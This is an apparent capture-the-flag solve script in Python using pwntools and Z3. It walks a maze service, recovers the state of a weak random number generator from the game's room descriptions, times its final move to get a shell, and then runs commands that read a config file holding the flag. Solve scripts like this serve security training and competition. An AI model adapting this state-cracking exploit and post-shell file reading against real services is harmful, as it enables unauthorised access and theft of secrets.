#!/usr/bin/env python3

import os
import pwn
import queue
import time
import re
import z3

pwn.context.log_level = "CRITICAL" # suppress connection log

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

# example maze:
# #############################
# #@#.......#.............#...#
# #.#.###.#.#######.#####.###.#
# #.#.#...#.#.....#.#...#.#...#
# #.###.###.#.###.#.###.#.#.#.#
# #...#.#.#.#.#...#...#...#.#.#
# ###.#.#.#.#.###.###.#.###.#.#
# #...#.#...#...#.#...#.....#.#
# #.###.#.#####.#.#.#########.#
# #.....#.......#...#.#.....#.#
# ###################.#.###.#.#
# #...................#.#.#...#
# #.#####.#######.#####.#.#####
# #.....#.#.......#.....#.....#
# #######.#########.#####.###.#
# #.....#.........#...#...#...#
# #.###.#.#######.###.#.###.###
# #.#...#.....#.....#...#...#.#
# #.#.#########.#########.###.#
# #.#.#.........#...#...#...#.#
# #.#.###.#.#####.#.#.#.###.#.#
# #.#...#.#.#.....#...#...#.#.#
# #.###.#.###.###########.#.#.#
# #.#.#...#...#.........#...#.#
# #.#.###.#.###.#######.#####.#
# #.#.....#...#...#...#...#...#
# #.#########.#####.#.#.#.#.#.#
# #.................#...#...#.#
# #################*###########
MAZE_SIZE = 29
dx = [1, 0,-1, 0]
dy = [0, 1, 0,-1]
INF = 0x3F3F3F3F

def read_maze(io):
    line_list = []
    for height in range(MAZE_SIZE):
        line_list.append(io.readline().decode().strip())
    return line_list

def get_position(maze, character):
    for (y, line) in enumerate(maze):
        x = line.find(character)
        if x > 0:
            return (x, y)
    raise Exception(f"Can not found position for '{character}'!")

def parse_current_random_value_from_description(description):
    m = re.search(r"As you step into the room, you find yourself standing in a ([\w -]+) space. The walls are adorned with ([\w ]+) and a two large ([\w ]+) dominate the center of the room. You see (\d+) flowers in a vase, and through a window you stop to count (\d+) stars. The room appears well designed in the ([\w ]+) style.", description)
    assert m is not None
    v2 = [
        "cozy",
        "medium-sized",
        "spacious",
        "massive",]
    v3 = [
        "bookshelves",
        "fireplaces",
        "suits of armor",
        "tables",
        "chests",
        "beds",
        "paintings",
        "statues",
        "tapestries",
        "candelabras",
        "chairs",
        "fountains",
        "mirrors",
        "rugs",
        "curtains",
        "chess sets",]
    v4 = [
        "Art Deco",
        "Baroque",
        "Classical",
        "Colonial",
        "Contemporary",
        "Country",
        "Gothic",
        "Industrial",
        "Mediterranean",
        "Minimalist",
        "Neoclassical",
        "Renaissance",
        "Rococo",
        "Romantic",
        "Rustic",
        "Victorian",
        ]

    def get_index(l, v):
        i = l.index(v)
        assert i >= 0
        return i
    b0 = get_index(v2, m.group(1))
    b1 = get_index(v3, m.group(2)) << 2
    b2 = get_index(v3, m.group(3)) << 6
    b3 = int(m.group(4)) << 14
    b4 = int(m.group(5)) << 14
    b5 = get_index(v4, m.group(6)) << 10
    value = b0 | b1 | b2 | b3 | b4 | b5
    return value

def get_steps_from_goal(maze, min_steps, initial_position, final_position):
    command_list = []
    (cx, cy) = final_position
    while (cx, cy) != initial_position:
        for i in range(4):
            nx = cx + dx[i]
            ny = cy + dy[i]
            if not (0 <= nx < MAZE_SIZE and 0 <= ny < MAZE_SIZE): continue
            # print(f"{cx = }, {cy = }, {min_steps[cy][cx] = }, {nx = }, {ny = }, {min_steps[ny][nx] = }")
            if min_steps[cy][cx] - 1 != min_steps[ny][nx]: continue
            (cx, cy) = (nx, ny)
            command_list.append("wnes"[i]) # 逆順
            break
        else:
            raise Exception(f"Cannot recover steps! {cx = }, {cy = }")
    return command_list[::-1]

def find_steps(maze):
    initial_position = get_position(maze, "@")
    final_position = get_position(maze, "*")
    min_steps = [[INF for i in range(MAZE_SIZE)] for j in range(MAZE_SIZE)]

    q = queue.Queue()
    q.put((initial_position[0], initial_position[1], 0))
    while not q.empty():
        (cx, cy, ct) = q.get(block=False)
        if min_steps[cy][cx] <= ct: continue
        min_steps[cy][cx] = ct

        # print(f"{cx =} , {cy = }, {ct = }")
        if maze[cy][cx] == "*":
            return get_steps_from_goal(maze, min_steps, initial_position, final_position)

        for i in range(4):
            nx = cx + dx[i]
            ny = cy + dy[i]
            if not (0 <= nx < MAZE_SIZE and 0 <= ny < MAZE_SIZE): continue
            if maze[ny][nx] == "#": continue
            q.put((nx, ny, ct+1))
    raise Exception("Cannot solve maze!")

def crack_random_value_and_goal_when_could_got_shell(io, last_command):
    def read_description_value(io):
        io.sendlineafter(b"or (q) end the torment:", "x".encode())
        description = io.recvline_contains(b"As you step into the room, you find yourself standing in").decode()
        return parse_current_random_value_from_description(description)

    # print("Cracking...")
    # https://inaz2.hatenablog.com/entry/2016/03/07/194000
    state = [z3.BitVec("state%d" % i, 32) for i in range(31)]
    s = z3.Solver()
    for i in range(93):
        state[(3+i) % 31] += state[i % 31]
        output = (state[(3+i) % 31] >> 1) & 0x7fffffff
        actual = read_description_value(io)
        s.add(output == actual)

    if s.check() != z3.sat:
        raise Exception("Can not solve by Z3!")
    m = s.model()

    # verify
    for i in range(93, 93+31):
        state[(3+i) % 31] += state[i % 31]
        output = m.evaluate((state[(3+i) % 31] >> 1) & 0x7fffffff)
        actual = read_description_value(io)
        # print(output, actual, m.evaluate(output == actual))

    # consume until rand will be 1312
    for i in range(93+31, 93+31+100000):
        state[(3+i) % 31] += state[i % 31]
        output = m.evaluate((state[(3+i) % 31] >> 1) & 0x7fffffff)
        if int(str(output)) % 1213 == 1212:
            io.sendlineafter(b"or (q) end the torment:", last_command.encode())
            return
        # consume it
        actual = read_description_value(io)
        # print(output, actual, m.evaluate(output == actual))

def solve(io_factory):
    with io_factory() as io:
        # cast arcane
        io.sendlineafter(b"or (q) end the torment:", b"a")
        io.recvuntil(b"You cast arcane eye and send your summoned magical eye above the maze.\n")
        maze = read_maze(io)
        # print("maze: ")
        # print("\n".join(maze))
        steps = find_steps(maze)
        # print("steps: ")
        # print(steps)
        for command in steps[:-1]: # go to a 1steps from target
            io.sendlineafter(b"or (q) end the torment:", command.encode())

        crack_random_value_and_goal_when_could_got_shell(io, steps[-1])

        prompt = io.clean(timeout=0.1)
        # print(prompt.decode())
        if b"You successfully exit the maze!" in prompt:
            io.sendline(b"./submitter") # Unless otherwise specified, the goal of each challenge is to execute "./submitter" which will print the flag. Your solution should then output the flag to stdout.
            io.sendline(b"cat /home/livectf/.config.toml") # This file contains the flag.
            # io.sendline(b"ls")
            # io.sendline(b"ls /home/livectf/")
            time.sleep(0.5)
        print(io.clean().decode())

io_factory = lambda: pwn.remote(HOST, int(PORT))
# io_factory = lambda: pwn.process("../handout/challenge")

solve(io_factory)
